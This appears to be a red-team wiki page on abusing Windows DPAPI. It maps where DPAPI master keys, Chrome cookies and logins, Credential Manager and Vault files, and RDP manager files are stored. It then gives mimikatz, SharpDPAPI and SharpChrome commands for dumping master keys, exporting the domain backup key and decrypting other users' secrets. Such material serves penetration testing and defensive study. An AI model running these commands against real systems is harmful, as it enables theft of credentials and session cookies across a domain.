# Abusing DPAPI

Windows' [[dpapi|Data Protection API (DPAPI)]] is used by several applications to encrypt secrets:

- Windows Credential Manager
- Windows Vault
- Google Chrome
- Remote Desktop Gateway files (`.rdg`)

These encrypted secrets are stored in standard locations. Depending on your level of access to a system, you can retrieve and decrypt these secrets, potentially opening up new access paths.

---

## Locations

DPAPI keys and the secrets that common applications encrypt/decrypt with DPAPI are stored in common paths in the filesystem.

All these can be listed using [SeatBelt's](https://github.com/GhostPack/Seatbelt) `user` command. If unelevated, it will show only the current user's. If elevated, it will show all users'.

In addition to listing each of these assets individually, SeatBelt will also draw the master key to secret relationship for you. When targeting a particular secret, make sure you know the GUID of its corresponding master key.

### Users' Master Keys

As mentioned [[dpapi|here]], each user can have zero or more master keys generated for them. Each is identified by a GUID (i.e., `{...}`) and stored in a file at `C:\Users\$USERNAME\AppData\Roaming\Microsoft\Protect\$USER_SID\$MASTER_KEY_GUID`.

Note that each master key is stored encrypted and can only be decrypted by the user's logon password **or** the domain backup DPAPI key.

### Google Chrome

- A user's cookies are stored in `C:\Users\$USERNAME\AppData\Local\Google\Chrome\User Data\Default\Cookies\`
- A user's saved login credential sare stored in `C:\Users\$USERNAME\AppData\Local\Google\Chrome\User Data\Default\Login Data\`

### Windows Credential Manager and Windows Vaults

Since Windows 7, Windows Credential Manager allows users to store credentials for websites and network resources.

- User credentials: `C:\Users\$USERNAME\AppData\Local\Microsoft\Credentials\`
- System credentials: `%SYSTEMROOT%\System32\config\systemprofile\AppData\Local\Microsoft\Credentials\`
- User vaults:
	- Stored at `C:\Users\$USERNAME\AppData\Local\Microsoft\Vault\$VAULT_GUID\`
		- Within each vault folder, there is a `Policy.vpol` file which contains two keys (AES128 AND AES256)
		- These two keys are encrypted by the user's DPAPI master key
		- These two keys, when decrypted, can be used to decrypt one or more `*.vcrd` files in the same folder

Note that these credentials were encrypted within LSA with the [CRYPTPROTECT_SYSTEM](https://docs.microsoft.com/en-us/previous-versions/ms995355(v=msdn.10)?redirectedfrom=MSDN) flag, which prevents them from being decrypted outside LSA, even by the current user. Thus, if you are targeting the current user, [[abusing-dpapi#Technique 1 Targeting the Current User|technique #1]] won't work--you need to explicitly pass in the target secret's corresponding master key. You'll have to use [[abusing-dpapi#Technique 3 Local Admin Targeting a Non-Logged On User with Their Plaintext Password or NTLM|technique #3]] instead.

### Remote Desktop Connection Manager Files (`.rdg`)

Windwos' Remote Desktop Connection Manager allows you to save RDP credentials encrypted via DPAPI. They are stored in `.rdg` files. There is no common location for them, but they're worth being aware of.

---

## Abuse Techniques

Based on your access level, there are four broad techniques for abusing DPAPI to decrypt these applications' secrets.

### Technique #1: Targeting the Current User

DPAPI is designed to be called by the current user without having to provide a master key. Thus, you can simply [[abusing-dpapi#Targeting Current User No Master Key Needed|decrypt the target secret]].

### Technique #2: Local Admin, Targeting a Logged On User

Grab the current logged on users' DPAPI master keys.

```batch
mimikatz sekurlsa::dpapi
```

Note the master key that matches the GUID of the master key used to encrypt the target secret. Leverage that master key to [[abusing-dpapi#Targeting Other User Master Key Needed|decrypt the secret]].

### Technique #3: Local Admin, Targeting a Non-Logged On User with Their Plaintext Password or NTLM

Leverage [[runas]] (or Cobalt Strike's [[cobalt-strike-user-impersonation#Make Token with Credential|make_token]] or [[cobalt-strike-user-impersonation#Spawn New Beacon with Credential|spawnas]]) with the target user's credential to spawn a new logon session as them. This logon session works through the network only, so [[abusing-dpapi#Technique 1 Targeting the Current User|technique #1]] isn't going to work.

Instead, leverage the network only logon session to take advantage of MS-BKRP (BackupKey Remote Protocol) to request the domain controller to decrypt the target user's master key for you using the domain DPAPI backup key.

```batch
mimikatz [@]dpapi::masterkey /in:"$PATH_TO_TARGET_USERS_MASTER_KEY_FILE" /rpc
```

- Note the `@` prefix is only necessary to force Cobalt Strike to use the network only session token

With the master key in hand, [[abusing-dpapi#Targeting Other User Master Key Needed|decrypt the secret]].

### Technique #4: Elevated Domain Access, Targeting any Domain User

With elevated domain access, request the domain DPAPI backup key from the domain controller.

```batch
mimikatz lsadump::backupkeys /system:$FQDN_OR_IP_OF_DC /export
```

- This produces the backup key in a `.pvk` file that needs to be exfiltrated

OR

```batch
SharpDPAPI.exe backupkey
```

- This produces the backup key as a base64 blob

With the domain backup key in hand, you can now exfiltrate any target master keys and secrets and decrypt them offline.

Decrypt the target master key using the domain backup key.

```batch
mimikatz dpapi::masterkey /in:$PATH_TO_MASTER_KEY_FILE /pvk:$PATH_TO_DOMAIN_BACKUP_KEY_PVK_FILE
```

With the master key in hand, [[abusing-dpapi#Targeting Other User Master Key Needed|decrypt the secret]].

---

## Decrypting a Secret

### Targeting Current User, No Master Key Needed

- Chrome Cookies or Logins File

```batch
mimikatz dpapi::chrome /in:"$PATH_TO_CHROME_COOKIES_OR_LOGINS_FILE" /unprotect
```

```batch
SharpChrome.exe cookies /unprotect
```

```batch
SharpChrome.exe logins /unprotect
```

- Remote Desktop Connections Manager File (`.rdg`)

```batch
mimikatz dpapi::rdg /in:"$PATH_TO_RDG_FILE" /unprotect
```

```batch
SharpDPAPI.exe rdg /unprotect
```

### Targeting Other User, Master Key Needed

Note that `SharpDPAPI` and `SharpChrome` offer multiple ways of specifying one or more master keys. See the documentation for specifics. Below is a common method.

- Chrome Cookies or Logins File

```batch
mimikatz dpapi::chrome /in:"$PATH_TO_COOKIE_OR_LOGINS_FILE" /masterkey:$MASTERKEY
```

```batch
SharpChrome.exe cookies $MASTERKEY_GUID:$MASTERKEY_SHA1
```

```batch
SharpChrome.exe logins $MASTERKEY_GUID:$MASTERKEY_SHA1
```

- Remote Desktop Connections Manager File (`.rdg`)

```batch
mimikatz dpapi::rdg /in:"$PATH_TO_RDG_FILE" /masterkey:$MASTERKEY
```

```batch
SharpDPAPI.exe rdg $MASTERKEY_GUID:$MASTERKEY_SHA1
```

- Windows Credential Manager or Windows Vault file:

```batch
mimikatz dpapi::cred /in:"$PATH_TO_FILE" /masterkey:$MASTERKEY
```

```batch
SharpDPAPI.exe credentials $MASTERKEY_GUID:$MASTERKEY_SHA1
````

```batch
SharpDPAPI.exe vaults $MASTERKEY_GUID:$MASTERKEY_SHA1
```

---

## References

[Operational Guidance for Offensive DPAPI Abuse - SpecterOps](https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107)

[SharpDPAPI & SharpChrome GitHub Repository](https://github.com/GhostPack/SharpDPAPI)

[Mimikatz dpapi](https://tools.thehacker.recipes/mimikatz/modules/dpapi)
